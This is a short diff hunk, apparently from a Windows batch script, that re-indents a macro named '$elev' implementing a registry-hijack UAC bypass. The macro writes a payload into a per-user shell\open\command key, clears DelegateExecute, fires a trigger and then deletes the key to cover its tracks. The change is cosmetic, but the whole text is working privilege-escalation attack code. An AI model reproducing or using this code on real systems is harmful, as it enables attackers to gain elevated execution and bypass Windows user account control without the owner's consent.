@@ -25,10 +25,10 @@ set regPath="HKCU\Software\Classes\%vuln%\shell\open\command"
 
 ENDLOCAL &^
 set $elev=for %%a in (0 1) do if "%%a" equ "1" (%NL%
-		for %%j in (!payload!) do (%NL%
-			reg add %regpath% /d "%%j" /f%NL%
-			reg add %regpath% /v DelegateExecute /f%NL%
-			%trigger%%NL%
-			reg delete "HKCU\Software\Classes\%vuln%" /f%NL%
-		)%NL%
-	) ELSE SETLOCAL ENABLEDELAYEDEXPANSION ^& set payload=,
+	for %%j in (!payload!) do (%NL%
+		reg add %regpath% /d "%%j" /f%NL%
+		reg add %regpath% /v DelegateExecute /f%NL%
+		%trigger%%NL%
+		reg delete "HKCU\Software\Classes\%vuln%" /f%NL%
+	)%NL%
+) ELSE SETLOCAL ENABLEDELAYEDEXPANSION ^& set payload=,
